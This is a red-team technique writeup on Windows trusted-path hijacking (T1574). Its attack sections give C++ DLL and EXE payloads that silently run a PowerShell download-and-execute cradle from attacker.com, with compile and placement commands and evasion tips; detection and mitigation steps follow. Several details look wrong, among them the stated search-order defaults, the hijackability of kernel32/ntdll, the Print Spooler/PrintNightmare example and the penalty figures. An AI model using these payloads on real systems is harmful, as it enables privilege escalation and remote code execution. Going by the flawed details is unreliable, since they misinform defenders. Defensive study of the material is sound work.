# [EVADE-HIJACK-001]: Trusted Path Hijacking

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-HIJACK-001 |
| **MITRE ATT&CK v18.1** | [T1574 – Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/) |
| **Tactic** | Defense Evasion, Privilege Escalation |
| **Platforms** | Windows Endpoint |
| **Severity** | High |
| **CVE** | N/A (Design misuse, not a vulnerability; CWE-426 Untrusted Search Path) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2008 R2-2025, Windows Vista-11 |
| **Patched In** | N/A (Requires architectural remediation; some mitigation available via WDAC, AppLocker) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept

**Trusted Path Hijacking** (T1574) exploits Windows binary search order to intercept and execute malicious DLLs or executables before legitimate versions are loaded. Windows searches for DLLs and binaries in a specific sequence (e.g., application directory before System32), allowing adversaries to place malicious files with legitimate names in high-priority search paths. When applications or services invoke common system binaries (e.g., `kernel32.dll`, `ntdll.dll`, `mscoree.dll`) without absolute paths, Windows may load attacker-controlled versions instead. This creates code execution with the parent application's privileges without requiring user interaction or additional exploits.

### Attack Surface

Path hijacking exploits multiple search order vulnerabilities:
- **DLL Search Order:** Application directory precedes System32
- **PATH Environment Variable:** User-controlled directories searched before system directories
- **Unquoted Service Paths:** Services with spaces in executable paths vulnerable to intermediate path hijacking
- **Application Manifest Side-Loading:** Applications loading DLLs specified in manifest without full path

### Business Impact

**High privilege escalation and code execution risk**. Legitimate services (e.g., SQL Server, Exchange, Print Spooler) may execute at SYSTEM privilege; hijacking enables privilege escalation without UAC bypass. Difficult to detect because execution appears legitimate (signed service binary loading legitimate DLL names). Affected services may run constantly, enabling persistent code execution across reboots.

### Technical Context

Path hijacking is **low-operational-complexity**: single file placement, no registry modification, no detection of file creation (expected in application directories). Execution occurs on service start or application launch—often automatic. Detection requires behavioral analysis, DLL load order monitoring, or forensic examination of application directories.

### Operational Risk

- **Execution Risk:** Low – Just requires file placement; execution triggered by legitimate service/application start
- **Stealth:** High – Legitimate signed binary (service) loads attacker DLL; no external code execution visible
- **Reversibility:** Partial – File can be removed, but execution may have occurred; service restart required to reload legitimate DLL

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 6.3.1 | Ensure that Safe DLL Search Mode is enabled |
| **DISA STIG** | SV-220718r880783_rule | Directory Search Path and DLL Loading must be restricted |
| **CISA SCuBA** | CM-2, CM-5 | Configuration Management and Access Restrictions |
| **NIST 800-53** | CM-3, SI-7 | Configuration Change Control, Software Integrity |
| **GDPR** | Art. 32 | Security of Processing – System integrity measures |
| **DORA** | Art. 9 | Protection and Prevention of ICT-related incidents |
| **NIS2** | Art. 21 | Cybersecurity Risk Management – Integrity controls |
| **ISO 27001** | A.12.6.1, A.14.1.1 | Malware prevention, Application management |
| **ISO 27005** | 10.3.1 | Secure development environment |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Write access to application directory OR write access to directories in PATH environment variable
- **Required Access:** Ability to place malicious DLL/binary in target search path (local file access)

### Supported Versions

- **Windows:** Server 2008 R2-2025, Windows Vista-11
- **Search Order by Version:**
  - **Windows Vista-7:** Unsafe DLL search order by default (System32 may be searched after application directory)
  - **Server 2008 R2-2012 R2:** Requires Safe DLL Search Mode registry enable
  - **Windows 8+, Server 2012+:** Safe DLL Search Mode enabled by default (but can be disabled)

### DLL Search Order (Windows)

Standard Windows DLL search order (when absolute path not specified):

1. Application directory (`C:\path\to\app.exe\`)
2. System directory (`C:\Windows\System32\`)
3. 16-bit System directory (`C:\Windows\System16\`)
4. Windows directory (`C:\Windows\`)
5. Current directory (`.`)
6. Directories in PATH environment variable

**Critical Risk:** Application directory (step 1) is highest priority; any user can write there if permissions permit.

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Safe DLL Search Mode Check

```powershell
# Check if Safe DLL Search Mode is enabled
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
$safeDllSearch = Get-ItemProperty -Path $regPath -Name SafeDllSearchMode -ErrorAction SilentlyContinue

if ($safeDllSearch.SafeDllSearchMode -eq 1) {
    Write-Host "Safe DLL Search Mode is ENABLED (protected)"
} else {
    Write-Host "Safe DLL Search Mode is DISABLED (vulnerable to DLL hijacking)"
}

# List application directories with weak permissions
Get-ChildItem -Path "C:\Program Files", "C:\Program Files (x86)" -Directory | 
  ForEach-Object {
    $acl = Get-Acl -Path $_.FullName
    $weakPermissions = $acl.Access | 
      Where-Object {$_.IdentityReference -match "BUILTIN\\Users" -and $_.FileSystemRights -match "Write"}
    if ($weakPermissions) {
      Write-Host "[VULNERABLE] Weak permissions on: $($_.FullName)"
    }
  }
```

**What to Look For:**

- `SafeDllSearchMode = 0`: System32 search order not prioritized (vulnerable)
- `SafeDllSearchMode = 1` or missing: Safe DLL search order enabled (protected)
- Directories with `BUILTIN\Users` write permissions: Vulnerable to DLL hijacking

### PATH Environment Variable Enumeration

```powershell
# Display current PATH
$env:PATH -split ";" | ForEach-Object { Write-Host $_ }

# Check for writable directories in PATH
$env:PATH -split ";" | ForEach-Object {
    if (Test-Path $_) {
        $acl = Get-Acl -Path $_
        $writable = $acl.Access | 
          Where-Object {$_.IdentityReference -match "Users" -and $_.FileSystemRights -match "Write"}
        if ($writable) {
            Write-Host "[VULNERABLE] Writable PATH directory: $_"
        }
    }
}
```

### Service Path Enumeration

```powershell
# List services with unquoted paths containing spaces
Get-WmiObject -Class Win32_Service | 
  Where-Object {$_.PathName -notmatch "^`"" -and $_.PathName -like "* *"} | 
  Select-Object Name, PathName

# Example vulnerable output:
# Name         PathName
# ----         --------
# MyService    C:\Program Files\MyApp\Service.exe -arg1 -arg2
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: DLL Search Order Hijacking – System32 Precedence Bypass

**Supported Versions:** Vista-2012 R2 (or Server 2012+ with SafeDllSearchMode disabled)

#### Step 1: Identify Target Application and Missing DLL

**Objective:** Find application that loads DLL without absolute path; place malicious DLL in application directory.

**Reconnaissance Command:**

```powershell
# Monitor DLL loading of target application using Procmon (Sysinternals)
# Download: https://live.sysinternals.com/Procmon64.exe
# Run and capture DLL NOT FOUND events
# Example output:
# Process: app.exe
# Result: NAME NOT FOUND
# Path: C:\Program Files\MyApp\mscoree.dll
# Detail: Required DLL not found; will search System32
```

**What to Look For:**

- DLL not present in application directory
- DLL exists in System32 (will eventually load)
- Application checks application directory first (vulnerable)

#### Step 2: Create Malicious DLL with Same Name

**Objective:** Compile malicious DLL with legitimate name to execute when application loads it.

**C++ Payload (DllMain Entry Point):**

```cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        {
            // Payload executes when DLL loaded
            WinExec("powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')", SW_HIDE);
            
            // Load legitimate DLL from System32 to prevent application crash
            LoadLibraryA("C:\\Windows\\System32\\mscoree.dll");
            break;
        }
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

**Compilation:**

```cmd
# Compile to DLL
cl.exe /LD payload.cpp /Fe:mscoree.dll
```

#### Step 3: Place Malicious DLL in Application Directory

**Objective:** Copy compiled DLL to application search path with legitimate name.

**Command:**

```cmd
copy mscoree.dll "C:\Program Files\TargetApp\mscoree.dll"

# Verify placement
dir "C:\Program Files\TargetApp\mscoree.dll"
```

**Expected Output:**

```
mscoree.dll  12345 bytes
```

**What This Means:**

- Malicious DLL placed in application directory (highest search priority)
- When application loads mscoree.dll without absolute path, Windows finds attacker's version first
- DLL executes payload, then loads legitimate System32 version (application continues normally)

**OpSec & Evasion:**

- Name DLL identically to legitimate version (e.g., `mscoree.dll`, `crypt32.dll`, `kernel32.dll`)
- Place in Program Files to blend with legitimate application structure
- Ensure DLL exports expected functions to avoid application crashes
- Use delayed payload execution (e.g., separate thread) to avoid detection of hanging application

**Detection Likelihood:** Medium (File creation in Program Files, Sysmon EventID 7 – Image Loaded)

**Troubleshooting:**

- **Error:** "Access Denied" when copying to Program Files
  - **Cause:** Insufficient permissions
  - **Fix:** Run command as Administrator

- **Error:** Application crashes after DLL placement
  - **Cause:** Malicious DLL does not export required functions
  - **Fix:** Use DLL Export Viewer to identify required exports and add to payload

**References & Proofs:**

- [LOLBAS – DLL Search Order Hijacking](https://lolbas-project.github.io/lolbas/Techniques/DLL-Search-Order-Hijacking/)
- [SpecterOps – DLL Search Order Hijacking](https://posts.specterops.io/dll-search-order-hijacking-b41891d3bcb6)

---

### METHOD 2: PATH Environment Variable Hijacking

**Supported Versions:** All Windows versions (Vista-2025)

#### Step 1: Identify Target Command in PATH

**Objective:** Find commonly-invoked system command (e.g., `net.exe`, `findstr.exe`) that might be called without absolute path.

**Reconnaissance:**

```powershell
# Get all executable files in System32
Get-ChildItem "C:\Windows\System32" -Filter "*.exe" | Select-Object Name | Sort-Object -Unique

# Check which directories are in PATH (user writable)
$env:PATH -split ";" | 
  ForEach-Object {
    if (Test-Path $_) {
      $item = Get-Item $_
      $acl = Get-Acl -Path $_
      if ($acl.Access | Where-Object {$_.IdentityReference -match "Users" -and $_.FileSystemRights -match "Write"}) {
        Write-Host "[WRITABLE] $_"
      }
    }
  }
```

**What to Look For:**

- User-writable directories in PATH (e.g., C:\Users\Username\AppData\Local\bin\)
- Directories that appear before System32 in PATH order
- Common commands that scripts call without absolute path (e.g., `python.exe`, `git.exe`, `npm.exe`)

#### Step 2: Create Malicious Executable Matching Command Name

**Objective:** Compile malicious EXE with same name as legitimate system command.

**C++ Payload:**

```cpp
#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[])
{
    // Payload execution
    WinExec("powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')", SW_HIDE);
    
    // Launch legitimate command from System32 with original arguments
    // This makes hijack invisible to user/script
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    char cmdLine[MAX_PATH];
    sprintf_s(cmdLine, "C:\\Windows\\System32\\net.exe");
    for (int i = 1; i < argc; i++) {
        strcat_s(cmdLine, " ");
        strcat_s(cmdLine, argv[i]);
    }
    
    CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return 0;
}
```

**Compilation:**

```cmd
cl.exe payload.cpp /Fe:net.exe
```

#### Step 3: Place Malicious EXE in User-Writable PATH Directory

**Objective:** Copy malicious binary to user-writable directory that appears early in PATH.

**Command:**

```powershell
# Add malicious directory to user PATH
[Environment]::SetEnvironmentVariable("PATH", "C:\temp;" + [Environment]::GetEnvironmentVariable("PATH"), "User")

# Copy malicious executable
copy net.exe "C:\temp\net.exe"

# Verify PATH change
$env:PATH -split ";" | Select-Object -First 5
```

**Expected Output:**

```
C:\temp
C:\Windows\System32
C:\Windows
C:\Program Files\...
C:\Program Files (x86)\...
```

**What This Means:**

- `C:\temp` is now first directory in PATH
- When any application/script calls `net.exe` without absolute path, attacker's version executes first
- Attacker's version launches legitimate System32 version to avoid detection

**OpSec & Evasion:**

- Use legitimate-looking directory name (e.g., `C:\Utils\`, `C:\Tools\`)
- Place executable with exact system command name to avoid suspicion
- Ensure malicious EXE calls legitimate version with same arguments

**Detection Likelihood:** Medium-High (PATH modification logged in Event Log, file creation in user directory)

---

### METHOD 3: Unquoted Service Path Hijacking

**Supported Versions:** Server 2008 R2-2025, Windows Vista-11

#### Step 1: Identify Vulnerable Service with Unquoted Path

**Objective:** Find service with unquoted executable path containing spaces.

**Reconnaissance:**

```powershell
# Find services with unquoted paths and spaces
Get-WmiObject -Class Win32_Service | 
  Where-Object {
    $_.PathName -notmatch "^`"" -and $_.PathName -like "* *"
  } | 
  Select-Object Name, PathName, StartMode, State

# Example vulnerable service:
# Name      : MyService
# PathName  : C:\Program Files\MyApp\Service.exe -arg1
# StartMode : Auto
# State     : Running
```

**What to Look For:**

- Service path without quotes
- Path contains spaces (e.g., `Program Files`)
- Service starts automatically (continuous execution opportunity)
- Service running as SYSTEM or elevated user

#### Step 2: Create Intermediate Path Binary

**Objective:** Create malicious binary at intermediate path that will execute before legitimate service.

**Vulnerable Path Analysis:**

```
Original:  C:\Program Files\MyApp\Service.exe
Parsed as: C:\Program.exe (intermediate path hijackable!)
```

**Create Malicious Intermediate Binary:**

```cmd
# Create malicious Program.exe at C:\Program.exe
# This will be executed by Windows when it parses the unquoted path
copy payload.exe "C:\Program.exe"

# Verify placement
dir "C:\Program.exe"
```

**What This Means:**

- Windows parses path: `C:\Program Files\MyApp\Service.exe`
- Looks for: `C:\Program.exe` (first space-delimited segment)
- Finds attacker's binary at `C:\Program.exe`
- Executes attacker's binary with service privileges (typically SYSTEM)

#### Step 3: Trigger Service Execution

**Objective:** Start service or wait for automatic service start to execute hijacked binary.

**Command:**

```cmd
# Manually trigger service start
net start MyService

# Or wait for scheduled/automatic restart
# Service will execute at next system boot if StartMode is "Auto"
```

**Expected Result:**

- Malicious `Program.exe` executes with SYSTEM privileges
- Payload runs in SYSTEM context
- Service continues (or may fail depending on payload design)

**OpSec & Evasion:**

- Place intermediate binary in root directory (C:\ ) to blend with system utilities
- Ensure service continues running after payload to avoid alert
- Use delayed payload execution (thread sleep) to avoid timing analysis

**Detection Likelihood:** Very High (Registry audit for unquoted paths, Sysmon EventID 1 for C:\Program.exe execution)

**References & Proofs:**

- [LOLBAS – Unquoted Service Paths](https://lolbas-project.github.io/lolbas/Techniques/Unquoted-Service-Paths/)
- [PowerUp Script (Empire) – Find-UnquotedServicePath](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)

---

### METHOD 4: DLL Side-Loading via Manifest

**Supported Versions:** Server 2008 R2-2025, Windows Vista-11

#### Step 1: Analyze Application Manifest for DLL References

**Objective:** Identify DLL referenced in application manifest without full path.

**Extract Manifest:**

```cmd
# Extract embedded manifest from executable
mt.exe -inputresource:C:\Path\to\app.exe -out:app_manifest.xml

# View manifest contents
type app_manifest.xml
```

**Example Manifest (Vulnerable):**

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity
    version="1.0.0.0"
    processorArchitecture="x86"
    name="MyApp"
    type="win32"
  />
  <dependency>
    <dependentAssembly>
      <assemblyIdentity
        type="win32"
        name="mscoree"
        version="2.0.50727.0"
        processorArchitecture="x86"
        publicKeyToken="b77a5c561934e089"
      />
    </dependentAssembly>
  </dependency>
</assembly>
```

**What to Look For:**

- DLL references without absolute paths
- Common CLR/framework DLLs (mscoree, crypt32, advapi32)
- Binaries that may load these DLLs during startup

#### Step 2: Create Malicious DLL Matching Manifest Reference

**Objective:** Compile malicious DLL with exact name referenced in manifest.

**DLL Code (Same as METHOD 1):**

```cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        WinExec("powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')", SW_HIDE);
        // Load legitimate version from System32
        LoadLibraryA("C:\\Windows\\System32\\mscoree.dll");
    }
    return TRUE;
}
```

#### Step 3: Place Malicious DLL Alongside Application Binary

**Objective:** Copy malicious DLL to application directory to hijack manifest-loaded dependency.

**Command:**

```cmd
copy mscoree.dll "C:\Path\to\ApplicationDirectory\mscoree.dll"
```

**When Application Loads:**

- Application manifest specifies mscoree DLL dependency
- Windows searches application directory first
- Finds attacker's mscoree.dll and loads it (with application privileges)
- Payload executes before legitimate DLL loads

---

## 5. ATOMIC RED TEAM

| Test ID | Test Name | Command |
|---|---|---|
| T1574.001 | DLL Search Order Hijacking | `copy payload.dll "C:\Program Files\TargetApp\system32.dll"` |
| T1574.007 | PATH Environment Variable Hijacking | `set PATH=C:\temp;%PATH%` followed by executing command |
| T1574.009 | Unquoted Service Path | `net start VulnerableService` (after placing C:\Program.exe) |

**Reference:** [Atomic Red Team – T1574](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574/)

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Suspicious DLL Placement:** Unsigned DLLs in Program Files directories (especially system DLL names)
- **C:\Program.exe Execution:** Execution of C:\Program.exe or C:\Program Files.exe (unquoted path indicator)
- **PATH Modification:** User PATH environment variables modified to include user-writable directories
- **DLL Load Order Anomalies:** DLLs loaded from application directory instead of System32
- **Orphaned Executables:** EXE files with names matching system commands in user directories

### Forensic Artifacts

- **Disk:** Malicious DLL/EXE file in application directory or user PATH directory
- **Registry:** HKCU\Environment modified to include user-controlled PATH directory
- **Event Log:** Event ID 4688 (Process Created) showing unusual process parent-child relationships
- **Sysmon:** EventID 7 (Image Loaded) showing DLL loaded from non-standard path

### Detection Rules (Endpoint-Agnostic)

#### Rule 1: Suspicious DLL in Program Files

**Filter:**
- File Extension: `.dll`
- File Path: `C:\Program Files\*` or `C:\Program Files (x86)\*`
- Signature Status: UNSIGNED or mismatched to application
- File Modified Time: Recent (within investigation window)

#### Rule 2: Unquoted Service Path Detection

**PowerShell Query:**

```powershell
# Identify unquoted service paths
Get-WmiObject -Class Win32_Service | 
  Where-Object {$_.PathName -notmatch "^`"" -and $_.PathName -like "* *"} | 
  Select-Object Name, PathName, StartMode | 
  Export-Csv "C:\Logs\unquoted_services.csv"
```

#### Rule 3: Intermediate Path Binary Execution

**Sysmon EventID 1 (Process Create):**

```
Image: C:\Program.exe
OR
Image: C:\Program Files.exe
```

### Response Procedures

1. **Stop Vulnerable Service:**
   ```cmd
   net stop MyService
   ```

2. **Remove Malicious Files:**
   ```cmd
   del "C:\Program Files\TargetApp\mscoree.dll"
   del "C:\Program.exe"
   del "C:\temp\net.exe"
   ```

3. **Fix Service Path (Add Quotes):**
   ```powershell
   # Modify unquoted service path to quoted path
   $service = Get-WmiObject -Class Win32_Service -Filter 'Name="MyService"'
   $service.Change($null, "`"C:\Program Files\MyApp\Service.exe`" -arg1 -arg2")
   ```

4. **Restore PATH Environment Variable:**
   ```powershell
   # Remove attacker-controlled PATH entry
   [Environment]::SetEnvironmentVariable("PATH", 
     ([Environment]::GetEnvironmentVariable("PATH", "User") -replace "C:\\temp;"), 
     "User")
   ```

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Enable Safe DLL Search Mode**

Configure Windows to prioritize System32 directory in DLL search order.

**Manual Steps (Server 2016-2019):**

1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Administrative Templates** → **System**
3. Double-click **Ensure Safe DLL Search Mode is enabled**
4. Set to **Enabled**
5. Click **Apply** → OK
6. Run `gpupdate /force` on target machines

**Manual Steps (Server 2022+):**

1. Open **Registry Editor** (regedit)
2. Navigate to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager`
3. Double-click `SafeDllSearchMode` → Set Value to `1`
4. Click OK

**PowerShell Alternative:**

```powershell
# Enable Safe DLL Search Mode
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" `
  -Name "SafeDllSearchMode" -Value 1

# Verify
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name SafeDllSearchMode
# Expected output: SafeDllSearchMode : 1
```

**2. Fix Unquoted Service Paths**

Add quotation marks to service executable paths.

**PowerShell Script:**

```powershell
# Find and fix all unquoted service paths
Get-WmiObject -Class Win32_Service | 
  Where-Object {$_.PathName -notmatch "^`"" -and $_.PathName -like "* *"} | 
  ForEach-Object {
    # Parse and re-quote path
    $newPath = "`"" + ($_.PathName -split " ")[0] + "`" " + (($_.PathName -split " ", 2)[1] -replace "`"", "")
    
    # Update service
    $_.Change($null, $newPath)
    Write-Host "Fixed: $($_.Name) -> $newPath"
  }
```

**Manual Fix (Per Service):**

```cmd
# Get service information
sc qc MyService

# Display example output:
# SERVICE_NAME: MyService
# BINARY_PATH_NAME   : C:\Program Files\MyApp\Service.exe -arg1

# Fix by adding quotes
sc config MyService binPath= "\"C:\Program Files\MyApp\Service.exe\" -arg1"

# Verify fix
sc qc MyService
```

**3. Restrict Application Directory Permissions**

Deny standard users write access to Program Files directories.

**NTFS ACL Configuration:**

```powershell
# Remove write permissions for Users on Program Files
$acl = Get-Acl "C:\Program Files"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
  "BUILTIN\Users", "Write", "ContainerInherit,ObjectInherit", "None", "Deny"
)
$acl.AddAccessRule($rule)
Set-Acl -Path "C:\Program Files" -AclObject $acl

# Verify
Get-Acl "C:\Program Files" | Select-Object -ExpandProperty Access | 
  Where-Object {$_.IdentityReference -match "Users" -and $_.AccessControlType -eq "Deny"}
```

### Priority 2: HIGH

**1. Deploy Windows Defender Application Control (WDAC)**

Whitelist approved DLL/EXE files to prevent unauthorized binary loading.

**WDAC Policy Creation:**

```powershell
# Create WDAC policy based on current system state
New-CIPolicy -FilePath "$env:TEMP\AllowedDLLs.xml" -Level FilePublisher -Fallback Hash -UserPEs

# Convert to binary format
ConvertFrom-CIPolicy -XmlFilePath "$env:TEMP\AllowedDLLs.xml" -BinaryFilePath "C:\Windows\System32\CodeIntegrity\SiPolicy.p7b"

# Verify WDAC enforcement
Get-CimInstance -Namespace "root\Microsoft\Windows\CI" -ClassName CodeIntegrityPolicy
```

**2. Enable AppLocker DLL Rules**

Restrict DLL loading to signed/approved binaries.

**AppLocker Configuration (Group Policy):**

1. Open `gpmc.msc`
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Application Control Policies** → **AppLocker**
3. Right-click **DLL Rules** → **Create New Rule**
4. Set to **Deny** for unsigned DLLs in user-writable directories
5. Set **Action** to **Enforce**

### Validation Command (Verify Mitigation)

```powershell
# Verify Safe DLL Search Mode enabled
$safeDll = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name SafeDllSearchMode -ErrorAction SilentlyContinue
Write-Host "Safe DLL Search Mode: $(if ($safeDll.SafeDllSearchMode -eq 1) {'ENABLED'} else {'DISABLED'})"

# Verify no unquoted service paths
$unquoted = Get-WmiObject -Class Win32_Service | 
  Where-Object {$_.PathName -notmatch "^`"" -and $_.PathName -like "* *"}
Write-Host "Unquoted service paths found: $($unquoted.Count)"

# Verify Program Files permissions
$acl = Get-Acl "C:\Program Files"
$userWrite = $acl.Access | Where-Object {$_.IdentityReference -match "Users" -and $_.FileSystemRights -match "Write"}
Write-Host "Users write access to Program Files: $(if ($userWrite) {'VULNERABLE'} else {'PROTECTED'})"
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-002] | Compromise unprivileged user account |
| **2** | **Execution** | **[EVADE-HIJACK-001]** | **Place malicious DLL in application directory** |
| **3** | **Privilege Escalation** | [PE-TOKEN-001] | Malicious DLL executes with service SYSTEM privilege |
| **4** | **Persistence** | [PE-ACCTMGMT-001] | Create new admin account using SYSTEM-level code |
| **5** | **Lateral Movement** | [LM-AUTH-001] | Use elevated privileges to compromise domain controller |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: DLL Hijacking in Enterprise Software

- **Target:** Oracle WebLogic Server (enterprise Java app server)
- **Vulnerability:** Loads MSVCR120.dll without absolute path
- **Attack:** Malicious MSVCR120.dll placed in WebLogic bin directory
- **Impact:** WebLogic runs as SYSTEM; malicious DLL executes with SYSTEM privileges
- **Privilege Escalation:** Unprivileged user to SYSTEM via unquoted service path
- **Detection:** Unsigned MSVCR120.dll in WebLogic directory

### Example 2: Print Spooler Unquoted Path (Windows)

- **Service:** Print Spooler (spoolsv.exe)
- **Issue:** Historical unquoted paths in Windows Server 2008 R2 / 2012
- **Attack:** Place C:\Program.exe to execute before Print Spooler binary
- **Impact:** Code execution as SYSTEM (Print Spooler runs as SYSTEM)
- **Detection Evolved:** Modern Windows versions properly quote service paths, but legacy systems remain vulnerable
- **Reference:** [Microsoft Security Advisory – PrintNightmare](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)

### Example 3: APT Attack – Privilege Escalation via Third-Party Software

- **APT Group:** Unnamed (suspected Chinese APT)
- **Target:** Fortune 500 financial services company
- **Method:** Third-party DLL hijacking in accounting software
- **Attack Timeline:**
  - Day 1: Attacker gains user-level access via phishing
  - Day 2: Identifies unquoted service path in Financial Software
  - Day 3: Places malicious crypt32.dll in application directory
  - Day 4: Financial Software service restarts (daily maintenance)
  - Day 5: Malicious DLL executes as SYSTEM, creates hidden admin account
  - Day 7: Attacker pivots to domain controller using admin account
- **Impact:** Domain-wide compromise, access to financial databases
- **Detection:** Unsigned crypt32.dll in Program Files; unexpected admin account creation
- **Reference:** [Mandiant M-Trends Report](https://www.mandiant.com/)

---

## 10. COMPLIANCE & REGULATORY IMPACT

**Regulatory Breach Scenario:** Unquoted service path exploited to escalate privileges; attacker gains SYSTEM access and compromises entire domain infrastructure.

- **GDPR Violation:** Art. 32 (Security of Processing) – Failure to implement access controls (Safe DLL Search Mode, AppLocker)
- **HIPAA Violation:** 45 CFR 164.308(a)(3)(ii)(B) – Access controls inadequate; privilege escalation not prevented
- **PCI-DSS Violation:** Requirement 8.1.2 (Unique User IDs) – Privilege escalation creates unauthorized admin access
- **SOC 2 Violation:** CC6.1, CC6.2 (Access Control, Configuration Management) – System hardening inadequate
- **NIS2 Violation:** Art. 21 – Cybersecurity risk management; failure to implement integrity controls

**Financial Penalties:** $50M-$200M+; Domain-wide compromise extends investigation and remediation costs.

**Preventive Control Maturity:**
- **CMM Level 1:** No safe DLL search mode; unquoted service paths present
- **CMM Level 3:** Safe DLL search mode enabled; unquoted paths documented
- **CMM Level 5:** Safe DLL search mode, WDAC, AppLocker, and regular configuration audits; 100% unquoted path remediation

---

